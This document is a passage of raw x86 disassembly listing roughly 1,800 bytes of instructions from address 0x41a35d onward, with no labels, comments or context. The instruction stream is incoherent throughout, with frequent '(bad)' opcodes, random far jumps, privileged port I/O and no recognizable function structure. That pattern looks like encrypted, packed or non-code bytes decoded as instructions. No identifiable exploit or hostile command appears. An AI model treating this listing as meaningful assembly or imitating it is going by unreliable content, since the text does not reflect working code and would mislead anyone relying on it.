  41a35d:	jno    0x41a3c0
  41a35f:	pop    esp
  41a360:	xchg   ebp,eax
  41a361:	in     eax,0xd4
  41a363:	fdiv   QWORD PTR [ebx]
  41a365:	pop    es
  41a366:	mov    ebx,0xd8eec2ac
  41a36b:	adc    bh,dh
  41a36d:	sar    ch,cl
  41a36f:	or     BYTE PTR [ebp+0x4f],bh
  41a372:	inc    ecx
  41a373:	inc    esi
  41a374:	je     0x41a3e0
  41a376:	mov    bl,0x7d
  41a378:	inc    ebx
  41a379:	push   cs
  41a37a:	adc    ebx,DWORD PTR ds:0x79a17e18
  41a380:	aas    
  41a381:	xchg   esp,eax
  41a382:	loopne 0x41a3ad
  41a384:	(bad)  
  41a385:	jo     0x41a3b5
  41a387:	inc    esp
  41a388:	xlat   BYTE PTR ds:[ebx]
  41a389:	repz xchg edi,eax
  41a38b:	das    
  41a38c:	add    al,0xbe
  41a38e:	adc    al,0xf4
  41a390:	sub    BYTE PTR [ecx-0x56bf51b0],dl
  41a396:	mov    ds:0x5d99a08f,al
  41a39b:	leave  
  41a39c:	enter  0x56af,0x8e
  41a3a0:	pop    esp
  41a3a1:	cmc    
  41a3a2:	ret    
  41a3a3:	inc    eax
  41a3a4:	and    edi,ebx
  41a3a6:	(bad)  
  41a3a8:	pop    es
  41a3a9:	cdq    
  41a3aa:	in     eax,dx
  41a3ab:	mov    esp,0x94419189
  41a3b0:	cmp    eax,0x6608ad92
  41a3b5:	pop    eax
  41a3b6:	pop    edi
  41a3b7:	fwait
  41a3b8:	enter  0x6163,0xca
  41a3bc:	cmp    BYTE PTR [esi+edx*8-0x1d],ch
  41a3c0:	jae    0x41a42f
  41a3c2:	dec    ebx
  41a3c3:	jns    0x41a397
  41a3c5:	dec    ecx
  41a3c6:	push   ss
  41a3c7:	and    dh,BYTE PTR [eax+edx*2-0x4ee1b104]
  41a3ce:	enter  0x7220,0xf6
  41a3d2:	mov    edx,0x75c8cc61
  41a3d7:	push   cs
  41a3d8:	adc    ch,BYTE PTR [esi-0xd92c017]
  41a3de:	int    0xe9
  41a3e0:	xchg   edx,eax
  41a3e1:	sahf   
  41a3e2:	ins    BYTE PTR es:[edi],dx
  41a3e3:	aas    
  41a3e4:	dec    esp
  41a3e5:	pop    edx
  41a3e6:	push   esp
  41a3e7:	sub    DWORD PTR ds:0xf2e8aa6,edi
  41a3ed:	mov    cl,0x81
  41a3ef:	jae    0x41a407
  41a3f1:	mov    DWORD PTR ss:[esi+ebp*4],esp
  41a3f5:	jge    0x41a46b
  41a3f7:	mov    ah,BYTE PTR [edx-0x453ddbf3]
  41a3fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3fe:	and    ebx,DWORD PTR [esi-0x44]
  41a401:	fcomp  QWORD PTR [ebp-0x33]
  41a404:	jb     0x41a3b1
  41a406:	lds    ebp,FWORD PTR [ecx]
  41a408:	dec    ebp
  41a409:	lods   al,BYTE PTR ds:[esi]
  41a40a:	mov    al,0x5c
  41a40c:	popf   
  41a40d:	(bad)  
  41a40e:	push   0xffffffb2
  41a410:	int    0x6a
  41a412:	outs   dx,BYTE PTR ds:[esi]
  41a413:	mov    esi,0xd21f8531
  41a418:	jo     0x41a3b9
  41a41a:	mov    al,0xd7
  41a41c:	inc    ecx
  41a41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a41e:	sbb    al,0xb8
  41a420:	imul   edi,DWORD PTR [ebx+0x47],0x27
  41a424:	push   eax
  41a425:	lods   eax,DWORD PTR ds:[esi]
  41a426:	sbb    cl,BYTE PTR [eax-0x3030cfff]
  41a42c:	out    0x0,al
  41a42e:	jnp    0x41a3b4
  41a430:	test   DWORD PTR [ecx+0x68c99f09],esp
  41a436:	push   edx
  41a437:	fild   DWORD PTR [ecx]
  41a439:	cmp    eax,0xa5f0cf84
  41a43e:	outs   dx,DWORD PTR ds:[esi]
  41a43f:	mov    eax,0x135720df
  41a444:	lods   eax,DWORD PTR ds:[esi]
  41a445:	push   ebx
  41a446:	jmp    0xa197:0xb29b2524
  41a44d:	jg     0x41a3ea
  41a44f:	jb     0x41a477
  41a451:	cdq    
  41a452:	ja     0x41a4d0
  41a454:	push   ss
  41a455:	jne    0x41a4c0
  41a457:	iret   
  41a458:	ds int3 
  41a45a:	daa    
  41a45b:	popf   
  41a45c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a45d:	or     al,BYTE PTR [ecx-0xed5bfe]
  41a463:	cmp    al,0x60
  41a465:	lods   eax,DWORD PTR ds:[esi]
  41a466:	push   edi
  41a467:	mov    bh,0x66
  41a469:	scas   eax,DWORD PTR es:[edi]
  41a46a:	inc    ebx
  41a46b:	out    0x33,al
  41a46d:	cmp    DWORD PTR [esi+0x6dc901a6],edx
  41a473:	stos   BYTE PTR es:[edi],al
  41a474:	add    DWORD PTR [eax+0x3a],0x92f144aa
  41a47b:	cmp    esi,DWORD PTR [esi-0x34]
  41a47e:	push   edi
  41a47f:	and    eax,0x2973ecd7
  41a484:	(bad)  
  41a486:	adc    eax,0x799a991e
  41a48b:	fldcw  WORD PTR [ecx]
  41a48d:	fild   DWORD PTR ds:0xf0daf144
  41a493:	test   BYTE PTR ds:0x5786fa23,dh
  41a499:	lea    ebp,[ebp+0xbfb0b86]
  41a49f:	or     DWORD PTR [edi+0x6],eax
  41a4a2:	or     BYTE PTR [edi-0x4f],bl
  41a4a5:	jne    0x41a49b
  41a4a7:	frstor [edi]
  41a4a9:	jmp    0x5c9959c0
  41a4ae:	xchg   ebx,eax
  41a4af:	std    
  41a4b0:	aad    0x8b
  41a4b2:	and    BYTE PTR [ecx+eax*4-0x5a],dl
  41a4b6:	es icebp 
  41a4b8:	mov    esi,0x9c378eaf
  41a4bd:	adc    bh,dl
  41a4bf:	inc    esi
  41a4c0:	ret    0x8f8b
  41a4c3:	(bad)  
  41a4c4:	dec    esp
  41a4c5:	sbb    BYTE PTR [ecx-0x62],ah
  41a4c8:	pop    edi
  41a4c9:	fcmovu st,st(2)
  41a4cb:	adc    al,0x3e
  41a4cd:	or     al,0x28
  41a4cf:	add    DWORD PTR [edx],edi
  41a4d1:	jmp    0x3659:0x2b0f429e
  41a4d8:	stos   DWORD PTR es:[edi],eax
  41a4d9:	pop    esp
  41a4da:	in     al,0x6e
  41a4dc:	xchg   edx,eax
  41a4dd:	jmp    0xdae4:0xc9471650
  41a4e4:	mov    WORD PTR [edi-0x43f97503],?
  41a4ea:	scas   al,BYTE PTR es:[edi]
  41a4eb:	imul   ebx,DWORD PTR [ecx],0xffffffb6
  41a4ee:	cwde   
  41a4ef:	inc    esp
  41a4f0:	pop    ebp
  41a4f1:	jp     0x41a567
  41a4f3:	or     BYTE PTR [eax],ah
  41a4f5:	into   
  41a4f6:	test   BYTE PTR [esi],al
  41a4f8:	rcr    BYTE PTR [ecx-0x38],0x55
  41a4fc:	arpl   cx,bp
  41a4fe:	and    DWORD PTR [edx],ebx
  41a500:	and    esi,0x6ddb6c29
  41a506:	pop    ds
  41a507:	sar    DWORD PTR [edx-0x9208045],cl
  41a50d:	test   DWORD PTR ds:0xdb6d8852,esp
  41a513:	cli    
  41a514:	imul   eax,DWORD PTR [ecx+0x7a3426d8],0x2838f74f
  41a51e:	jmp    0x452fec4
  41a523:	pop    esi
  41a524:	sbb    dh,BYTE PTR [ebp+0x1e33a9d2]
  41a52a:	in     eax,0x60
  41a52c:	jmp    0xe58968bd
  41a531:	pop    edi
  41a532:	loop   0x41a54d
  41a534:	rcl    BYTE PTR [eax-0x7b],0x46
  41a538:	push   0x4d
  41a53a:	sub    al,ah
  41a53c:	ficom  WORD PTR [esi+eax*8]
  41a53f:	mov    eax,0xaedc5940
  41a544:	or     DWORD PTR [edi+0x64],ebp
  41a547:	(bad)  [edx]
  41a549:	sbb    edi,DWORD PTR [ebp-0x171e6215]
  41a54f:	cmp    eax,0xcbf40776
  41a554:	(bad)  
  41a555:	adc    DWORD PTR [ecx],0xc50f0058
  41a55b:	xor    al,ch
  41a55d:	pop    ecx
  41a55e:	and    ecx,esp
  41a560:	mov    ebp,DWORD PTR [eax-0x6ff0301b]
  41a566:	nop
  41a567:	je     0x41a507
  41a569:	sbb    BYTE PTR [edx+0x5d],0x48
  41a56d:	push   esi
  41a56e:	out    0xdd,al
  41a570:	shl    eax,0x86
  41a573:	cmc    
  41a574:	pop    ecx
  41a575:	and    al,0x18
  41a577:	xchg   esp,eax
  41a578:	sbb    DWORD PTR [esi+0x3c],esp
  41a57b:	fistp  DWORD PTR ds:0xd577cca
  41a581:	and    al,BYTE PTR [ebx+0x75]
  41a584:	cmp    ah,0xfb
  41a587:	stos   DWORD PTR es:[edi],eax
  41a588:	or     DWORD PTR [edx+0x74],edi
  41a58b:	pop    ecx
  41a58c:	adc    al,0x62
  41a58e:	mov    DWORD PTR [esp+edx*8-0x6c73abb0],edi
  41a595:	mov    cl,0x2f
  41a597:	jnp    0x41a57a
  41a599:	add    eax,0x66e7838f
  41a59e:	gs xchg ebx,eax
  41a5a0:	es gs push eax
  41a5a3:	jecxz  0x41a61c
  41a5a5:	popa   
  41a5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5a7:	and    eax,0x78ed329
  41a5ac:	push   ebp
  41a5ad:	ret    
  41a5ae:	(bad)
  41a5b1:	fisttp WORD PTR [eax]
  41a5b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5b4:	aam    0x46
  41a5b6:	mov    DWORD PTR [eax+eax*1-0x6469214b],ecx
  41a5bd:	push   0xffffffea
  41a5bf:	into   
  41a5c0:	jge    0x41a550
  41a5c2:	ror    ch,0x27
  41a5c5:	addr16 push ds
  41a5c7:	jecxz  0x41a629
  41a5c9:	lods   al,BYTE PTR ds:[esi]
  41a5ca:	jno    0x41a601
  41a5cc:	xchg   esi,eax
  41a5cd:	push   ds
  41a5ce:	je     0x41a63f
  41a5d0:	shr    BYTE PTR [edi+0x3e3687fe],1
  41a5d6:	test   DWORD PTR [ebp+esi*4+0x410632af],edx
  41a5dd:	ins    DWORD PTR es:[edi],dx
  41a5de:	enter  0x6422,0x8
  41a5e2:	sub    DWORD PTR [esi],ebx
  41a5e4:	jl     0x41a63c
  41a5e6:	push   ecx
  41a5e7:	pop    ss
  41a5e8:	inc    esp
  41a5e9:	add    al,0xa4
  41a5eb:	(bad)  
  41a5ec:	in     eax,dx
  41a5ed:	pop    es
  41a5ee:	mov    ds:0x8d5f2b6e,al
  41a5f3:	mov    BYTE PTR [edx],dl
  41a5f5:	fs add eax,0x6a18ec19
  41a5fb:	int3   
  41a5fc:	and    bh,BYTE PTR [edi+ebp*2+0x21d05993]
  41a603:	outs   dx,BYTE PTR ds:[esi]
  41a604:	sub    DWORD PTR [ecx-0x550994ec],esp
  41a60a:	scas   al,BYTE PTR es:[edi]
  41a60b:	test   BYTE PTR [ecx+0x144a703a],ah
  41a611:	enter  0x2e8,0xd0
  41a615:	dec    ebp
  41a616:	(bad)  
  41a618:	(bad)
  41a61c:	adc    BYTE PTR [eax],ch
  41a61e:	sar    BYTE PTR [eax],1
  41a620:	lock daa 
  41a622:	stos   DWORD PTR es:[edi],eax
  41a623:	push   ebx
  41a624:	xchg   ebx,eax
  41a625:	je     0x41a5f7
  41a627:	lods   eax,DWORD PTR ds:[esi]
  41a628:	push   ecx
  41a629:	add    eax,0xa9624fea
  41a62e:	popa   
  41a62f:	mov    esi,0xa45b88e1
  41a634:	aad    0x33
  41a636:	adc    edi,ebp
  41a638:	pushf  
  41a639:	push   0x25
  41a63b:	mov    BYTE PTR [edi+0x19],0x5
  41a63f:	push   ds
  41a640:	in     eax,dx
  41a641:	out    0x9a,al
  41a643:	out    dx,eax
  41a644:	(bad)
  41a649:	icebp  
  41a64a:	rcr    BYTE PTR [edi],1
  41a64c:	cmp    BYTE PTR [ebp+0xfbb4d20],ah
  41a652:	push   ebp
  41a653:	ficom  DWORD PTR [edi]
  41a655:	cmp    BYTE PTR [esi+0x5b],cl
  41a658:	xor    ecx,DWORD PTR [esi+0x59]
  41a65b:	dec    esi
  41a65c:	loopne 0x41a6d8
  41a65e:	mov    edi,0x18437541
  41a663:	sub    eax,0xaffdcb57
  41a668:	mov    eax,0xb90def1b
  41a66d:	lea    eax,[ecx-0x56adfa6c]
  41a673:	popf   
  41a674:	es repz push 0x41d8ef9
  41a67b:	or     DWORD PTR [edx+ebx*2-0x5b],edx
  41a67f:	sub    al,0x8c
  41a681:	outs   dx,BYTE PTR gs:[esi]
  41a683:	addr16 int 0x91
  41a686:	inc    ebx
  41a687:	pop    ds
  41a688:	js     0x41a65d
  41a68a:	mov    esi,0x3e323e67
  41a68f:	or     cl,BYTE PTR [eax]
  41a691:	or     al,0x36
  41a693:	cmp    DWORD PTR [eax+0x71ccd6a9],esi
  41a699:	dec    eax
  41a69a:	dec    ebp
  41a69b:	pop    ecx
  41a69c:	push   edi
  41a69d:	pushf  
  41a69e:	bound  ecx,QWORD PTR [esi-0x50]
  41a6a1:	push   ebx
  41a6a2:	push   ecx
  41a6a3:	call   0xdc1c:0x5d40c142
  41a6aa:	and    DWORD PTR [ecx+ebp*8-0x1f],esp
  41a6ae:	sbb    BYTE PTR [ebx+0x5bfcac6e],bl
  41a6b4:	rol    BYTE PTR [ebp+0x68],cl
  41a6b7:	mov    BYTE PTR [ecx],dl
  41a6b9:	adc    bl,BYTE PTR [edi-0xe]
  41a6bc:	lods   ax,WORD PTR ds:[esi]
  41a6be:	leave  
  41a6bf:	inc    BYTE PTR ds:0x374087b4
  41a6c5:	iret   
  41a6c6:	cmp    al,0x4b
  41a6c8:	popa   
  41a6c9:	xor    DWORD PTR [eax-0x1d],esi
  41a6cc:	jl     0x41a710
  41a6ce:	mov    BYTE PTR [ebp+edi*8+0x70],ch
  41a6d2:	push   ss
  41a6d3:	out    0x9,al
  41a6d5:	ficom  DWORD PTR [ecx+0x1e]
  41a6d8:	push   esi
  41a6d9:	fstp   TBYTE PTR [edx+0x22]
  41a6dc:	push   ebx
  41a6dd:	fwait
  41a6de:	lods   al,BYTE PTR ds:[esi]
  41a6df:	in     eax,0xe4
  41a6e1:	adc    ecx,ecx
  41a6e3:	push   edx
  41a6e4:	into   
  41a6e5:	jno    0x41a67a
  41a6e7:	rcl    BYTE PTR [eax],0x4
  41a6ea:	adc    dh,dh
  41a6ec:	(bad)  [edi+0x2f406e1e]
  41a6f2:	push   esi
  41a6f3:	out    dx,al
  41a6f4:	hlt    
  41a6f5:	jo     0x41a6c4
  41a6f7:	mov    ebx,0x35075e1c
  41a6fc:	and    ebp,edi
  41a6fe:	por    mm2,QWORD PTR [edi+0x6d]
  41a702:	loop   0x41a689
  41a704:	jo     0x41a6b4
  41a706:	js     0x41a6f1
  41a708:	mov    ebx,0x1ce71ee7
  41a70d:	mov    bl,0xcf
  41a70f:	fidiv  DWORD PTR [ecx]
  41a711:	adc    ah,BYTE PTR [edx+0x5]
  41a714:	popa   
  41a715:	dec    esp
  41a716:	fucomip st,st(4)
  41a718:	fsubr  QWORD PTR fs:[edx+esi*8+0x58fad6b9]
  41a720:	repnz out 0x35,eax
  41a723:	push   edx
  41a724:	jecxz  0x41a728
  41a726:	daa    
  41a727:	std    
  41a728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a729:	add    ah,ch
  41a72b:	push   ss
  41a72c:	(bad)  
  41a72d:	push   esi
  41a72e:	mov    al,ds:0x602615ef
  41a733:	xchg   ebp,eax
  41a734:	inc    esi
  41a735:	cmp    esi,edx
  41a737:	rol    BYTE PTR [edx-0x73],cl
  41a73a:	adc    DWORD PTR [ebx],ebp
  41a73c:	mov    eax,ds:0xdf55f31e
  41a741:	dec    BYTE PTR [eax-0x2f356ab4]
  41a747:	(bad)  
  41a748:	ret    
  41a749:	inc    ecx
  41a74a:	repz fcomp DWORD PTR [edi+0x3f]
  41a74e:	sar    BYTE PTR [edi+0x50a30e02],1
  41a754:	cmp    dl,dh
  41a756:	sbb    cl,BYTE PTR [edi+eiz*8+0x34aeb776]
  41a75d:	pop    edi
  41a75e:	addr16 or eax,0x86dc4d8
  41a764:	scas   eax,DWORD PTR es:[edi]
  41a765:	and    ch,ch
  41a767:	sub    ch,BYTE PTR [ebp-0xcae53d0]
  41a76d:	icebp  
  41a76e:	ins    BYTE PTR es:[edi],dx
  41a76f:	sbb    esp,DWORD PTR [edx+0x5051815c]
  41a775:	call   0xef37:0xa9e903b6
  41a77c:	jo     0xbd3fcac7
  41a782:	add    BYTE PTR [ebx-0xb],bl
  41a785:	push   cs
  41a786:	xchg   esp,eax
  41a787:	(bad)  
  41a788:	pop    eax
  41a789:	add    DWORD PTR [ecx-0x16],edx
  41a78c:	je     0x41a7b3
  41a78e:	or     eax,0xf820db12
  41a793:	pushf  
  41a794:	retf   
  41a795:	xor    BYTE PTR ss:[ebx],dh
  41a798:	inc    ebx
  41a799:	retf   0x81cd
  41a79c:	in     eax,0x40
  41a79e:	neg    DWORD PTR [edi+eax*8+0x33]
  41a7a2:	pop    eax
  41a7a3:	sbb    eax,0x52cf224d
  41a7a8:	jo     0x41a808
  41a7aa:	fisub  DWORD PTR [edx+0x62]
  41a7ad:	cmp    BYTE PTR [ecx-0x10],bh
  41a7b0:	adc    BYTE PTR [ebp+0x2a63555a],ah
  41a7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7b7:	clc    
  41a7b8:	das    
  41a7b9:	push   0x2c
  41a7bb:	xchg   edx,eax
  41a7bc:	add    BYTE PTR cs:[eax-0x20],0x52
  41a7c1:	pop    edi
  41a7c2:	xor    DWORD PTR [edi-0x63c0a38e],ecx
  41a7c8:	outs   dx,BYTE PTR ds:[esi]
  41a7c9:	or     eax,0x70cbb97d
  41a7ce:	mov    edx,0xb68e767
  41a7d3:	int3   
  41a7d4:	push   eax
  41a7d5:	clc    
  41a7d6:	scas   eax,DWORD PTR es:[edi]
  41a7d7:	mov    eax,0x315ecaa9
  41a7dc:	xchg   ecx,eax
  41a7dd:	loop   0x41a81c
  41a7df:	test   eax,0x6cfc5c72
  41a7e4:	lds    edi,FWORD PTR [ebx]
  41a7e6:	sbb    al,BYTE PTR [edx+0x85aa7a9]
  41a7ec:	dec    esp
  41a7ed:	mov    bh,0x31
  41a7ef:	cmp    eax,DWORD PTR [ecx-0x43]
  41a7f2:	cmp    DWORD PTR [ecx-0xd],edx
  41a7f5:	cmp    al,0x7f
  41a7f7:	mov    esp,0x4ec3264f
  41a7fc:	and    al,0x43
  41a7fe:	fcomp  st(2)
  41a800:	cmp    DWORD PTR [ecx],0x1e754d70
  41a806:	xor    ebx,DWORD PTR [edi]
  41a808:	stos   DWORD PTR es:[edi],eax
  41a809:	pop    edi
  41a80a:	mov    eax,ds:0x4ebb8aa9
  41a80f:	fistp  WORD PTR [ecx+0x517a3892]
  41a815:	sbb    dh,ch
  41a817:	and    ecx,ebx
  41a819:	xchg   edx,eax
  41a81a:	out    dx,eax
  41a81b:	mov    ds:0x299242d9,al
  41a820:	sub    ebp,DWORD PTR ds:0xb13a5de1
  41a826:	push   es
  41a827:	out    0xa5,eax
  41a829:	inc    ch
  41a82b:	and    eax,0x2548ad
  41a830:	and    ah,BYTE PTR [ecx]
  41a832:	inc    ebp
  41a833:	in     eax,dx
  41a834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a835:	nop
  41a836:	outs   dx,BYTE PTR ds:[esi]
  41a837:	cli    
  41a838:	aad    0xc5
  41a83a:	inc    eax
  41a83b:	loopne 0x41a85e
  41a83d:	fimul  WORD PTR [esi+eax*8-0x20]
  41a841:	push   edx
  41a842:	sub    eax,0x75477887
  41a847:	jbe    0x41a8a4
  41a849:	icebp  
  41a84a:	push   edi
  41a84b:	adc    al,0xce
  41a84d:	jecxz  0x41a869
  41a84f:	mov    esp,0x7755206d
  41a854:	gs dec edi
  41a856:	cmp    al,bh
  41a858:	(bad)  
  41a85a:	fsub   QWORD PTR [ecx]
  41a85c:	jmp    0xff99c065
  41a861:	aam    0xc6
  41a863:	xor    edi,DWORD PTR [edx+0x70c94010]
  41a869:	adc    dl,BYTE PTR [edi]
  41a86b:	in     al,dx
  41a86c:	(bad)  
  41a86d:	mov    ah,0x84
  41a86f:	(bad)  
  41a870:	sbb    BYTE PTR [edi+0x715087e7],al
  41a876:	lods   eax,DWORD PTR ds:[esi]
  41a877:	jge    0x41a864
  41a879:	dec    eax
  41a87a:	fs mov cl,0x6e
  41a87d:	cwde   
  41a87e:	sbb    eax,0x3400a12f
  41a883:	loop   0x41a84a
  41a885:	jne    0x41a8cf
  41a887:	cmp    BYTE PTR [ebp+0x68],dh
  41a88a:	es ret 
  41a88c:	test   BYTE PTR [edi],ah
  41a88e:	pop    eax
  41a88f:	je     0x41a877
  41a891:	inc    ecx
  41a892:	or     al,0x6e
  41a894:	idiv   BYTE PTR [esi+0x745f538a]
  41a89a:	xchg   ebp,eax
  41a89b:	mov    ebp,ebp
  41a89d:	(bad)  
  41a89e:	in     eax,dx
  41a89f:	xchg   BYTE PTR [ebp*4-0x231a3d1f],ah
  41a8a6:	sar    BYTE PTR gs:[esp+ebp*4-0x3e],cl
  41a8ab:	ja     0x41a91b
  41a8ad:	sub    BYTE PTR [edi+edi*2+0xe],dl
  41a8b1:	ds js  0x41a83a
  41a8b4:	xor    BYTE PTR [eax+0x111d7d59],cl
  41a8ba:	in     eax,0x99
  41a8bc:	xchg   ebx,eax
  41a8bd:	dec    ecx
  41a8be:	add    DWORD PTR [esi+ebx*8],eax
  41a8c1:	popa   
  41a8c2:	popf   
  41a8c3:	and    BYTE PTR [eax+0x32aa5418],bh
  41a8c9:	ret    0x67e2
  41a8cc:	mov    ds:0xf7f7c56a,al
  41a8d1:	(bad)  
  41a8d3:	xchg   ecx,eax
  41a8d4:	aas    
  41a8d5:	cdq    
  41a8d6:	add    DWORD PTR [edi+0x6b7acea3],esi
  41a8dc:	pop    eax
  41a8dd:	data16 jmp 0x41a8b6
  41a8e0:	sbb    eax,0xf0c7db62
  41a8e5:	mov    cl,0x59
  41a8e7:	icebp  
  41a8e8:	pop    ds
  41a8e9:	das    
  41a8ea:	fisubr WORD PTR [esi]
  41a8ec:	jp     0x41a8bf
  41a8ee:	sbb    edi,0x5b8b9913
  41a8f4:	xchg   ebx,eax
  41a8f5:	sahf   
  41a8f6:	rcl    BYTE PTR [ecx+eiz*1+0x17],1
  41a8fa:	das    
  41a8fb:	test   eax,0x4ae4690a
  41a900:	lahf   
  41a901:	mov    ds:0x44a176d9,eax
  41a906:	xchg   esi,eax
  41a907:	scas   eax,DWORD PTR es:[edi]
  41a908:	jmp    0x6dfa2923
  41a90d:	inc    esi
  41a90e:	cmc    
  41a90f:	mov    ah,0x3f
  41a911:	cmp    al,BYTE PTR [ebp-0x73ab89e9]
  41a917:	jb     0x41a8cc
  41a919:	sub    al,0x39
  41a91b:	cmp    eax,0xf2e958bd
  41a920:	add    BYTE PTR [esi],ah
  41a922:	out    0x1e,al
  41a924:	jp     0x41a8fc
  41a926:	in     al,dx
  41a927:	mov    ds:0x9f7c9cda,al
  41a92c:	xchg   edx,ebp
  41a92e:	icebp  
  41a92f:	shr    BYTE PTR [edx+eax*4+0x1e285d05],1
  41a936:	ud1    eax,ebp
  41a939:	xchg   BYTE PTR [ecx-0x9],al
  41a93c:	fsubr  st(7),st
  41a93e:	lock and DWORD PTR [edx+0x6d],edx
  41a942:	xchg   ch,bh
  41a944:	popf   
  41a945:	sub    esi,DWORD PTR [ebx+0x265f9ac]
  41a94b:	xchg   esp,eax
  41a94c:	or     al,0x1f
  41a94e:	or     eax,0x90b66346
  41a953:	pop    ebx
  41a954:	inc    ecx
  41a955:	mov    al,ds:0x89d76fe1
  41a95a:	aad    0xcf
  41a95c:	test   al,0x1f
  41a95e:	mov    ds:0x34367bb6,al
  41a963:	cdq    
  41a964:	ins    DWORD PTR es:[edi],dx
  41a965:	in     eax,0x27
  41a967:	or     eax,0x7bc06d3d
  41a96c:	or     eax,0x3eee4534
  41a971:	xchg   esp,eax
  41a972:	ins    DWORD PTR es:[edi],dx
  41a973:	les    edx,FWORD PTR [esi]
  41a975:	and    BYTE PTR [ebx-0x4d],bl
  41a978:	test   eax,0xb2d415b2
  41a97d:	xchg   esp,eax
  41a97e:	inc    esi
  41a97f:	imul   ecx,DWORD PTR [edi+0x6f],0xffffffee
  41a983:	xor    BYTE PTR [eax-0x50],cl
  41a986:	jecxz  0x41a9bf
  41a988:	stos   BYTE PTR es:[edi],al
  41a989:	push   0xe02e51a6
  41a98e:	leave  
  41a98f:	ins    BYTE PTR es:[edi],dx
  41a990:	inc    edx
  41a991:	lea    eax,[ecx-0x451c2316]
  41a997:	mov    ecx,0xde8b266f
  41a99c:	mov    ecx,0xf55ce1df
  41a9a1:	hlt    
  41a9a2:	outs   dx,BYTE PTR cs:[esi]
  41a9a4:	cdq    
  41a9a5:	dec    edi
  41a9a6:	jo     0x41a9d4
  41a9a8:	out    dx,al
  41a9a9:	and    al,0x5d
  41a9ab:	xor    BYTE PTR [eax],cl
  41a9ad:	xchg   DWORD PTR [edx+eiz*1],ecx
  41a9b0:	inc    edi
  41a9b1:	hlt    
  41a9b2:	stos   DWORD PTR es:[edi],eax
  41a9b3:	push   ds
  41a9b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9b5:	scas   eax,DWORD PTR es:[edi]
  41a9b6:	xor    eax,esi
  41a9b8:	sub    dh,ah
  41a9ba:	jle    0x41a986
  41a9bc:	(bad)  
  41a9bd:	imul   eax,DWORD PTR [esp-0xe],0x6a
  41a9c2:	fadd   DWORD PTR [ebx-0x9]
  41a9c5:	pop    ebp
  41a9c6:	sub    eax,0x25e48d73
  41a9cb:	call   eax
  41a9cd:	adc    esp,DWORD PTR [ebx]
  41a9cf:	stc    
  41a9d0:	fwait
  41a9d1:	adc    eax,0xf1f5f313
  41a9d6:	js     0x41a9ea
  41a9d8:	out    dx,eax
  41a9d9:	jp     0x41a9c8
  41a9db:	in     al,dx
  41a9dc:	jle    0x41aa26
  41a9de:	xor    eax,0x5e1704f1
  41a9e3:	jno    0x41a994
  41a9e5:	jecxz  0x41aa5a
  41a9e7:	jg     0x41aa31
  41a9e9:	xor    al,0xa5
  41a9eb:	hlt    
  41a9ec:	add    ecx,DWORD PTR [ebx+0x2c6e6d01]
  41a9f2:	mov    al,BYTE PTR [ebx]
  41a9f4:	lds    ebx,FWORD PTR [eax+0x1f]
  41a9f7:	rcr    BYTE PTR ds:0xa1c871a4,1
  41a9fd:	retf   
  41a9fe:	hlt    
  41a9ff:	int3   
  41aa00:	sbb    BYTE PTR [edx+edx*8+0xff466a4],ch
  41aa07:	dec    eax
  41aa08:	pop    ebx
  41aa09:	lods   al,BYTE PTR ds:[esi]
  41aa0a:	int3   
  41aa0b:	xor    al,BYTE PTR [eax-0x1e]
  41aa0e:	(bad)  
  41aa0f:	or     BYTE PTR [edx-0x9ebd9ad],bh
  41aa15:	in     al,0xea
  41aa17:	lods   al,BYTE PTR ds:[esi]
  41aa18:	dec    eax
  41aa19:	xchg   DWORD PTR [bp+si],esi
  41aa1c:	jns    0x41aa04
  41aa1e:	stos   BYTE PTR es:[edi],al
  41aa1f:	jmp    0xbcf1:0xe4c9a98e
  41aa26:	ins    DWORD PTR es:[edi],dx
  41aa27:	cmp    bl,BYTE PTR [ebp+0x16]
  41aa2a:	cmc    
  41aa2b:	pop    ecx
  41aa2c:	jmp    0x86c3:0x490750c9
  41aa33:	shl    DWORD PTR [ebp-0xda7ea0c],1
  41aa39:	outs   dx,DWORD PTR ds:[esi]
  41aa3a:	jb     0x41a9d0
  41aa3c:	xchg   ebx,eax
  41aa3d:	add    esi,edi
  41aa3f:	and    bh,cl
  41aa41:	sub    eax,0xf99227b6
  41aa46:	mov    ds:0x2486d59f,al
  41aa4b:	cli    
  41aa4c:	pop    ebp
  41aa4d:	cmc    
  41aa4e:	shl    DWORD PTR [ebp+0x15],0x1
  41aa52:	pop    ebx
  41aa53:	sub    ebp,ebx
  41aa55:	idiv   BYTE PTR [esi-0x718b267b]
  41aa5b:	daa    
  41aa5c:	and    cl,0x7e
  41aa5f:	jmp    0x69eb:0x60defa60
  41aa66:	xchg   esp,eax
  41aa67:	fxch   st(4)
  41aa69:	and    ch,BYTE PTR [edi]
  41aa6b:	jecxz  0x41aa2b
  41aa6d:	in     al,dx
  41aa6e:	cdq    
  41aa6f:	sub    DWORD PTR [ecx+0x3d],ebx
  41aa72:	ds das 
  41aa74:	or     DWORD PTR [edi],eax
  41aa76:	and    esp,DWORD PTR [edx+edi*8-0x7226f80]
  41aa7d:	rol    DWORD PTR [edx+0x1b],1
  41aa80:	jmp    0x41aab8
  41aa82:	cmp    ebp,DWORD PTR [eax]
  41aa84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa85:	arpl   WORD PTR [eax+ecx*2+0x24],ax
  41aa89:	sub    bl,bl
  41aa8b:	jno    0x41aaa6
  41aa8d:	out    0x1d,al
  41aa8f:	jmp    0x166:0xf4d075b0
  41aa96:	and    eax,0xea5ebcff
  41aa9b:	mov    ds:0xa58a057c,al
  41aaa0:	fist   WORD PTR [edi-0x25]
  41aaa3:	push   edi
  41aaa4:	or     al,bl
  41aaa6:	or     al,0x45
  41aaa8:	and    eax,0x8eddf523
  41aaad:	sbb    DWORD PTR [edi],ebp
  41aaaf:	jb     0x41aa5f
  41aab1:	xchg   ebx,eax
  41aab2:	int3   
  41aab3:	loope  0x41aab9
  41aab5:	sub    BYTE PTR [edx+ecx*4],0x90
  41aab9:	jmp    0x41ab11
  41aabb:	pop    ecx
  41aabc:	sbb    DWORD PTR [eax-0xe],esp
